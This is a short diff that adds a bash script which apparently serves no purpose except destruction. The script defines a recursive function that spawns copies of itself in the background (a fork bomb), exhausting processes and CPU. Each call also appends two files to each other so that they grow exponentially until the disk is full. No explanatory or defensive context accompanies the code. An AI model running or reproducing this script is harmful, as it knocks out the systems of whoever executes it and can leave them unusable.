@@ -1,0 +1,9 @@
+#!/bin/bash
+echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer1.txt
+echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer2.txt
+slay() {
+	cat kingslayer1.txt >> kingslayer2.txt
+	cat kingslayer2.txt >> kingslayer1.txt
+	slay | slay &
+}
+slay
